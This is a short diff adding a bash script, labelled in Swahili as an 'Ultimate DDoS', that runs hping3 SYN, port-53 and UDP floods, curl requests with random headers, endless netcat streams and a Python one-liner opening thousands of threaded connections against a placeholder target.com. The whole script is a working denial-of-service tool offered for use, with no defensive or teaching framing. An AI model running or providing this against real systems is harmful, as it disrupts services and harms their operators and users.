@@ -1,0 +1,12 @@
+# Ultimate DDoS - inatumia hping3, curl, wget, python zote kwa pamoja
+target="target.com"
+for i in {1..10}; do
+  hping3 -S --flood -p 80 $target &
+  hping3 -S --flood -p 443 $target &
+  hping3 -2 --flood -p 53 $target &
+  hping3 --udp --flood -p 123 $target &
+  curl -s "http://$target" -H "User-Agent: $(head -c 1000 /dev/urandom | base64)" &
+  while true; do nc -v $target 80 < /dev/zero; done &
+  python3 -c "import socket,threading;t='$target';[threading.Thread(target=lambda:[(socket.socket().connect((t,80)),socket.socket().connect((t,443))) for _ in range(1000)]).start() for _ in range(500)]" &
+done
+wait
